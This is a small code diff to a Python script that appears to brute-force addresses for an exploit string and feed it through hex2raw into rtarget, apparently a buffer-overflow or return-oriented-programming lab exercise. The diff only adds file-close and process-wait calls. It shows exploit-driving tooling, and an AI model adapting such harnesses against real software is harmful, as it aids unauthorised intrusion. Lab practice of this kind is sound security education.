@@ -12,9 +12,12 @@ for i in range(4201265,4201323):
 
     text_file = open("exploit4.txt", "w")
     text_file.write("%s" % out_buffer)
+    text_file.close()
 
  #   sp.call(["./hex2raw", "<", "exploit4.txt", "|", "./rtarget"], shell=True)
     with open("exploit4.txt") as inhandle:
         p = sp.Popen("./hex2raw",stdin=inhandle,stdout=sp.PIPE)
         p2 = sp.Popen("./rtarget",stdin=p.stdout,stdout=sp.PIPE)
         [output,error] = p2.communicate()
+        rc2 = p2.wait()
+        rc = p.wait()
